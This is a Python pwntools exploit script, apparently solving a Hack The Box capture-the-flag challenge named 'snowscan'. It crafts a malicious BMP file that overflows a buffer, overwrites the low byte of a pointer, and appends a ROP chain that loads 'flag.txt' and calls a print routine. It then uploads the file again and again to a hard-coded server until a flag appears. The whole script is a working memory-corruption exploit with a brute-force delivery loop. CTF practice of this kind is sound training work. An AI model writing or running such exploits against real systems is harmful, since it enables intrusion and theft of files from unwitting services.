#!/usr/bin/env python3

import requests
import shutil
import os
from pwn import *

e = ELF("./snowscan_patched")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'

TARGET_FILE='./target.bmp'

def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path, TARGET_FILE], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path, TARGET_FILE], '''
                      b *(main+395)
                      commands
                          if ($rax & 0xff) == 0x30
                            printf "RAX ends in 0x30!"
                            b *(main+515)
                            continue
                          else
                            quit
                          end
                      end
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path, TARGET_FILE], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(main+415)
                      b *(main+445)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def copy_and_append(source_path, dest_path, data_to_append):
    """
    Copies a file from source_path to dest_path and appends data.
    """
    try:
        # 1. Copy the file
        shutil.copy2(source_path, dest_path)
        info(f"Successfully copied {source_path} to {dest_path}")

        # 2. Append data in binary mode
        with open(dest_path, 'ab') as f:
            f.write(data_to_append)
            info(f"Successfully appended {len(data_to_append)} bytes to {dest_path}")

    except FileNotFoundError:
        info("Error: Source file not found.")
    except Exception as e:
        info(f"An error occurred: {e}")


def upload_file(file_path):
    url = 'http://154.57.164.81:30878/snowscan'
    with open(file_path, 'rb') as f:
        files = {'file': (file_path, f, 'image/bmp')}
        response = requests.post(url, files=files)
    return response.text


def main():
    rop = ROP(e)
    rop.rsi = u64(b'flag.txt')
    rop.rdi = e.bss()
    # The 0x000000000044e2bf is the address of `mov qword ptr [rdi], rsi; ret`
    load_flag_addr = 0x000000000044e2bf 
    rop.raw(load_flag_addr)
    rop.raw(e.sym.printFile)
    # The '\x97' is calculated from the location of the return address.
    # Assuming the ret address stores at 0x378 (see notes.txt),
    # then right after we overwrite the LSB of the buffer pointer, the i is 0x2e1. Then
    # new_buffer_pointer + 0x2e1 = ret_addr
    # => new_buffer_pointer = 0x378 - 0x2e1 = 0x97
    payload = flat(
            b'A' * 36,
            b'\x97', # overwrite LSB
            rop.chain(),
            )
    copy_and_append('./dummy.bmp', TARGET_FILE, payload)

    # Use the following code for debugging.
    # while True:
    #     r = conn()
    #     sleep(5)
    #     if r.poll() is None:  # The process is alive, the GDB command finds the target rax. We can continue the debugging.
    #         r.interactive()
    #     else:
    #         r.close()

    while True:
        resp = upload_file(TARGET_FILE)
        if 'HTB{' in resp:
                info(f'Success! The flag is {resp}')
                break


if __name__ == "__main__":
    main()
